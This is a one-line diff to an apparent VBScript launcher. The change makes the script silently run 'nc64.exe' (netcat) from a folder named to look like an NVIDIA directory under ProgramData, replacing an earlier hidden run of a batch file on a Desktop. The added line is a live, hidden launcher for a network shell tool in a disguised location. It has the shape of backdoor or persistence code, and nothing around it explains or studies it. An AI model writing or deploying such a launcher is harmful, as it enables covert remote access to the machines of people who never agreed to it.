@@ -1,1 +1,1 @@
-createobject("wscript.shell").run "C:\Users\dell\Desktop\a.bat",0
+createobject("wscript.shell").run "C:\ProgramData\NVIDIA DATE\nc64.exe",0
